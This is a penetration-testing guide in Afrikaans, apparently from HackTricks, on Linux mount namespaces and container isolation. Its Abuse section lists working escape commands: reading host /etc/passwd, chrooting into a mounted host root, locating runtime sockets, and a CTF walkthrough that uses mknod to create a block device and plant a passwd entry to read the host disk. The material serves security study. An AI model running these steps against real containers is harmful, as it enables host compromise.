# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die mount namespace beheer die **mount table** wat ’n proses sien. Dit is een van die belangrikste container-isolasiekenmerke, omdat die root filesystem, bind mounts, tmpfs mounts, procfs-aansig, sysfs-blootstelling en baie runtime-spesifieke helper mounts alles deur daardie mount table uitgedruk word. Twee prosesse kan albei toegang tot `/`, `/proc`, `/sys` of `/tmp` hê, maar waarna daardie paaie verwys, hang af van die mount namespace waarin hulle is.

Vanuit ’n container-security-perspektief is die mount namespace dikwels die verskil tussen “dit is ’n netjies voorbereide application filesystem” en “hierdie proses kan die host filesystem direk sien of beïnvloed”. Daarom draai bind mounts, `hostPath` volumes, privileged mount operations en writable `/proc`- of `/sys`-blootstellings alles om hierdie namespace.

## Werking

Wanneer ’n runtime ’n container begin, skep dit gewoonlik ’n vars mount namespace, berei ’n root filesystem vir die container voor, mount procfs en ander helper filesystems soos nodig, en voeg dan opsioneel bind mounts, tmpfs mounts, secrets, config maps of host paths by. Sodra daardie proses binne die namespace loop, is die stel mounts wat dit sien grootliks losgekoppel van die host se verstek-aansig. Die host kan steeds die werklike onderliggende filesystem sien, maar die container sien die weergawe wat die runtime daarvoor saamgestel het.

Dit is kragtig omdat dit die container laat glo dat dit sy eie root filesystem het, al bestuur die host steeds alles. Dit is ook gevaarlik omdat die proses, as die runtime die verkeerde mount blootstel, skielik sigbaarheid in host-hulpbronne kry wat die res van die security-model moontlik nie ontwerp is om te beskerm nie.

## Lab

Jy kan ’n private mount namespace skep met:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
As jy ’n ander shell buite daardie namespace oopmaak en die mount-tabel inspekteer, sal jy sien dat die tmpfs-mount slegs binne die geïsoleerde mount namespace bestaan. Dit is ’n nuttige oefening omdat dit toon dat mount-isolasie nie abstrakte teorie is nie; die kernel bied letterlik ’n ander mount-tabel aan die proses.

As jy ’n ander shell buite daardie namespace oopmaak en die mount-tabel inspekteer, sal die tmpfs-mount slegs binne die geïsoleerde mount namespace bestaan.

Binne containers is ’n vinnige vergelyking:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Die tweede voorbeeld demonstreer hoe maklik dit vir ’n runtime-konfigurasie is om ’n groot gat deur die filesystem-grens te slaan.

## Runtime Usage

Docker, Podman, containerd-gebaseerde stacks en CRI-O maak almal staat op ’n private mount namespace vir normale containers. Kubernetes bou op dieselfde meganisme voort vir volumes, geprojekteerde secrets, config maps en `hostPath` mounts. Incus/LXC-omgewings maak ook sterk staat op mount namespaces, veral omdat system containers dikwels ryker en meer masjienagtige filesystems as application containers blootstel.

Dit beteken dat wanneer jy ’n container-filesystemprobleem ondersoek, jy gewoonlik nie na ’n geïsoleerde Docker-gril kyk nie. Jy kyk na ’n mount-namespace- en runtime-konfigurasieprobleem wat uitgedruk word deur die platform wat die workload geloods het.

## Misconfigurations

Die mees voor die hand liggende en gevaarlike fout is om die host se root filesystem of ’n ander sensitiewe host-pad deur ’n bind mount bloot te stel, byvoorbeeld `-v /:/host` of ’n skryfbare `hostPath` in Kubernetes. Op daardie stadium is die vraag nie meer "kan die container op een of ander manier escape?" nie, maar eerder "hoeveel nuttige host-inhoud is reeds direk sigbaar en skryfbaar?" ’n Skryfbare host bind mount verander die res van die exploit dikwels in ’n eenvoudige kwessie van file placement, chrooting, config modification of runtime-socket discovery.

Nog ’n algemene probleem is om die host se `/proc` of `/sys` bloot te stel op maniere wat die veiliger container-view omseil. Hierdie filesystems is nie gewone data mounts nie; hulle is interfaces na kernel- en process-state. As die workload direk toegang tot die host-weergawes kry, hou baie van die aannames agter container-hardening op om behoorlik van toepassing te wees.

Read-only-beskerming is ook belangrik. ’n Read-only root filesystem beveilig nie outomaties ’n container nie, maar dit verwyder ’n groot hoeveelheid attacker staging space en maak persistence, helper-binary placement en config tampering moeiliker. Omgekeerd gee ’n writable root of writable host bind mount ’n attacker ruimte om die volgende stap voor te berei.

## Abuse

Wanneer die mount namespace misbruik word, doen attackers gewoonlik een van vier dinge. Hulle **lees host-data** wat buite die container moes gebly het. Hulle **wysig host-konfigurasie** deur writable bind mounts. Hulle **mount of remount addisionele resources** indien capabilities en seccomp dit toelaat. Of hulle **bereik kragtige sockets en runtime-state directories** wat hulle in staat stel om die container-platform self vir meer toegang te vra.

As die container reeds die host-filesystem kan sien, verander die res van die security model onmiddellik.

Wanneer jy ’n host bind mount vermoed, bevestig eers wat beskikbaar is en of dit writable is:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
As die host se root-filesystem read-write gemount is, is direkte host-toegang dikwels so eenvoudig soos:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
As die doel bevoorregte runtime-toegang eerder as direkte chrooting is, enumereer sockets en runtime-staat:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
As `CAP_SYS_ADMIN` teenwoordig is, toets ook of nuwe mounts van binne die container geskep kan word:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Volledige voorbeeld: Twee-Shell `mknod`-pivot

'n Meer gespesialiseerde misbruikpad ontstaan wanneer die container se root-gebruiker block devices kan skep, die host en container 'n user identity op 'n nuttige manier deel, en die aanvaller reeds 'n low-privilege foothold op die host het. In daardie situasie kan die container 'n device node soos `/dev/sda` skep, en die low-privilege host-gebruiker dit later deur `/proc/<pid>/root/` vir die ooreenstemmende container-proses lees.

Binne die container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Vanaf die host, as die ooreenstemmende gebruiker met lae voorregte nadat jy die container shell se PID opgespoor het:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Die belangrike les is nie die presiese CTF-string search nie. Dit is dat blootstelling van die mount namespace deur `/proc/<pid>/root/` ’n host-gebruiker in staat kan stel om device nodes wat deur die container geskep is, te hergebruik, selfs wanneer cgroup device policy direkte gebruik binne die container self verhoed het.

## Checks

Hierdie opdragte is daar om vir jou die filesystem view te wys waarin die huidige proses werklik loop. Die doel is om host-afgeleide mounts, skryfbare sensitiewe paths en enigiets wat breër lyk as ’n normale application container se root filesystem, raak te sien.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Wat hier interessant is:

- Bind mounts vanaf die host, veral `/`, `/proc`, `/sys`, runtime state-gidse of socket-liggings, behoort onmiddellik uit te staan.
- Onverwagte lees-skryf-mounts is gewoonlik belangriker as groot getalle lees-alleen-hulpmounts.
- `mountinfo` is dikwels die beste plek om te sien of ’n pad werklik van die host afkomstig of deur overlay ondersteun word.

Hierdie kontroles bepaal **watter hulpbronne in hierdie namespace sigbaar is**, **watter een van die host afkomstig is**, en **watter daarvan skryfbaar of sekuriteitsensitief is**.
{{#include ../../../../../banners/hacktricks-training.md}}
